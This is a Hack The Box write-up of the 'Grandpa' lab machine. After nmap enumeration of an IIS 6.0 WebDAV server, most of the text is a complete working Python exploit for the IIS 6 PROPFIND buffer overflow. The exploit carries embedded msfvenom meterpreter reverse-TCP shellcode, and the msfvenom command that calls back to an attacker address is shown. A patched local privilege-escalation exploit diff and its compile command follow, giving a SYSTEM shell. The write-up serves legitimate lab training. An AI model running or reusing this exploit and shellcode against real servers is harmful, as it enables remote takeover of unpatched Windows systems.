Title: HTB Grandpa box writeup
Tags: oscp, htb, iis
Summary: Manually rooting ancient box using well-known RCE
Date: 2020-10-23 17:00
Status: published

# Enumeration
Only HTTP available:
```text
    Nmap 7.80 scan initiated Wed Oct 21 23:10:56 2020 as: nmap -sS -p- -v -oA enum/nmap-ss-all 10.10.10.14
    Nmap scan report for grandpa.htb (10.10.10.14)
    Host is up (0.053s latency).
    Not shown: 65534 filtered ports
    PORT   STATE SERVICE
    80/tcp open  http
    Read data files from: /usr/bin/../share/nmap
    Nmap done at Wed Oct 21 23:12:51 2020 -- 1 IP address (1 host up) scanned in 115.59 seconds
```
This deployment supports WebDAV, just like `Granny` machine:
```text
    Nmap 7.80 scan initiated Wed Oct 21 23:14:53 2020 as: nmap -sC -A -T4 -sV -p80 -oA enum/nmap-sCVAT4-open 10.10.10.14
    Nmap scan report for grandpa.htb (10.10.10.14)
    Host is up (0.053s latency).
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 6.0
    | http-methods: 
    |_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
    |_http-server-header: Microsoft-IIS/6.0
    |_http-title: Under Construction
    | http-webdav-scan: 
    |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
    |   Server Date: Wed, 21 Oct 2020 20:15:01 GMT
    |   Server Type: Microsoft-IIS/6.0
    |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
    |_  WebDAV type: Unknown
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Wed Oct 21 23:15:02 2020 -- 1 IP address (1 host up) scanned in 8.51 seconds
```
It doesn't allow to list files (or there aren't any) or to upload files, like
it was done in the `Granny` machine, so there probably should be some other
way in.

# Exploitation
The box seems pretty empty so it was straightforward to try to find some
exploits for IIS 6 and there's indeed some interesting
[RCE](https://www.exploit-db.com/exploits/41738) exploit in EDB. It looked
weird with these blobs and I found an
[equivalent](https://www.exploit-db.com/exploits/41992) as a metasploit module.
After a couple of hours it was rewritten, proper offset was found and exploit
finally worked well. There was some mystic obstacle in form of instantly dying
meterpreter shell. I overcome this by producing shellcode with exact same
options (well not the host and port obviously) like in the module. Resultant
script is like this:
```python
import socket, time


ip = '10.10.10.14'
port = 80

# found by trial and error decreasing padlen from 114
padlen = 95
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))
payload = 'PROPFIND / HTTP/1.1\r\n'
payload += 'Host: {}\r\n'.format(ip)
payload += 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n'
payload += 'Content-Length: 0\r\n'
payload += 'If: <http://{}:{}/{}'.format(ip, port, 'a' * padlen)
payload += ("\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c"
    "\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5"
    "\x99\x94\xe4\x9d\xac\xe6\x95\x83"
    "\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d"
    "\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5"
    "\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88"
    "\xc8\x82\xc8\x82\xe1\x8b\x80\xe6"
    "\xa0\x83\xe6\xb1\x84\xe5\x89\x96"
    "\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd"
    "\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4"
    "\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92"
    "\xe4\x85\x90\xe6\x99\x8d\xe1\x8f"
    "\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6"
    "\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6"
    "\xe7\x91\x81\xe4\x8d\xac\xe1\x8f"
    "\x80\xe6\xa0\x83\xe5\x8d\x83\xe6"
    "\xa9\x81\xe7\x81\x92\xe3\x8c\xb0"
    "\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81"
    "\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7"
    "\xa5\x81\xe7\xa9\x90\xe4\xa9\xac")
payload += '>'
payload += ' (Not <locktoken:write1>) <http://{}:{}/{}'.format(
    ip, port, 'b' * padlen)
payload += ("\xe5\xa9\x96\xe6\x89\x81\xe6\xb9"
    "\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5"
    "\x90\xb3\xe3\x85\x82\xe5\xa1\xa5"
    "\xe5\xa5\x81\xe7\x85\x90\xe3\x80"
    "\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5"
    "\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83"
    "\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9"
    "\x8f\xe6\xa0\x80\xe4\x89\x87\xe7"
    "\x99\xaa\xe1\x8f\x80\xe6\xa0\x83"
    "\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5"
    "\x87\xe5\x88\xb4\xe4\xad\xa6\xe4"
    "\xad\x82\xe7\x91\xa4\xe7\xa1\xaf"
    "\xe6\x82\x82\xe6\xa0\x81\xe5\x84"
    "\xb5\xe7\x89\xba\xe7\x91\xba\xe4"
    "\xb5\x87\xe4\x91\x99\xe5\x9d\x97"
    "\xeb\x84\x93\xe6\xa0\x80\xe3\x85"
    "\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6"
    "\xa0\x81\xe1\x91\xa0\xe6\xa0\x83"
    "\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf"
    "\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0"
    "\x83\xd1\xae\xe6\xa0\x83\xe7\x85"
    "\xae\xe7\x91\xb0\xe1\x90\xb4\xe6"
    "\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81"
    "\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4"
    "\xb1\xe6\x99\xae\xe4\xa5\x95\xe3"
    "\x81\x92\xe5\x91\xab\xe7\x99\xab"
    "\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90"
    "\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6"
    "\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8"
    "\xe4\xb5\xa9\xe3\x99\xac\xe4\x91"
    "\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6"
    "\xa0\x80\xe4\xa1\xb7\xe3\x89\x93"
    "\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd"
    "\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6"
    "\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81")

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.35 LPORT=443  \
# EXITFUNC=process PrependMigrate=true -f python -o met-1435-443.py -a x86 \
# --platform windows -e x86/unicode_mixed BufferRegister=ESI -b '\x00' -s 2000
payload += ("VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAA"
    "Z1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBil"
    "hiQzYp9pm0omTCWULKcQhDRPKNYo9oRmb4NDOpr2qXfQOZ2KEaIoJ5tMmto4opJ"
    "Kc0aNDMSH1PNwr0ma7koc23rHJdIpM0LHR3ocr3r6B3BH49XLOOrfio6uauUpD4"
    "1IpjQ0cPi7lPocb3Lqwkb3ioNW2HdnQwf2MoKOYE0Tphr5m1ypM0zKP9B0KOmgq"
    "X95J8UmiWKOGeocPSr3BkNlO4il0QR30SYolwC8vfDlTZPykO7epjKOQX14zPOE"
    "GpioWejHUKyoiokO3BCEBN1TrLplP3OBYpXhD1yoIoiojHwRYokOYoyliXcRypk"
    "Pm01PqyjEp1up344KNplpbkobLLBkR2LTrksBlhzoegMzO6p1io4loLs13Ljbll"
    "O05q8OJmyqI7GrZRQBNw2kQBJp2kNjMldKNlN148ySPH9qwaPQbkNymPiqvsdK0"
    "IZx8cLzNiDK044KyqfvMayotlGQhOlMKQVgnXWprUkFlCqmyhOKQmLdRUHdqHtK"
    "aHMT9qj336DKLLpKbkohMLyqz3Bk9t4KyqXPE9Q4KtLd1KaKoqb91J0QKO9PooO"
    "oojDKMB8kbmqMoxp3oBypIps8bWBSoBQOb4phnlsGKvLGu9xhkOJ0ehtPiqkPkP"
    "NIHDR4NpPhO9ap0kIpKOWe2JYzox9zlJjnNCox9rM0iqEk4I8fpPpPpPpPMpr0q"
    "0r0BHjJlOgoGpIoz5bw0jZpb6b7C8ryde3D1Q9oiEDE5p1dKZyo0NIxd58lXhRG"
    "Yp9pM02JKPPj9tpV1GPhLBiIVhQOYo8U1sHxIpSN06TK06aZOPrHKPzpIpYpnvq"
    "ZkP2HaHfDnsWuYoHUrspSQZIpR6oc27oxlBhYvhQO9o8UqsL8IpsMo8QH0hypMp"
    "ipkPbJypPPs8LKLojoLpyoZ5b738sE2N0Ms1YovuonQNkOlLo4Zore0p9o9okO8"
    "iSkyoYoKOZaEsnIi6sE91WSekL0duG2R6QZipocyogeAA")

payload += '>\r\n\r\n'
print "=" * 80
print 'PADLEN = {}'.format(padlen)
print payload

sock.send(payload)  
time.sleep(10)
print "*" * 80

sock.close()
```
Finally the shell popped out:

![service shell](/cstatic/htb-grandpa/service-shell.png)

# Privilege escalation
Privilege escalation was the same as for `Grandpa` box. I just grabbed
[this exploit](https://www.exploit-db.com/exploits/37755) and tinkered it a bit.
Here's the diff:
```text
    78c78
    < typedef DWORD NTSTATUS;
    ---
    > // typedef DWORD NTSTATUS;
    132c132
    <                 "c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32",   // Start cmd.exe
    ---
    >                 "c:\\windows\\temp\\m-1435-53.exe",   // Start cmd.exe
    423c423
    < }
    \ No newline at end of file
    ---
    > }
```
Compiled with 
`i686-w64-mingw32-gcc-win32 -I /usr/share/mingw-w64/include/ 37755.c -o a.exe`.
Fortunately spawned SYSTEM meterpreter session:

![root shell](/cstatic/htb-grandpa/root-shell.png)
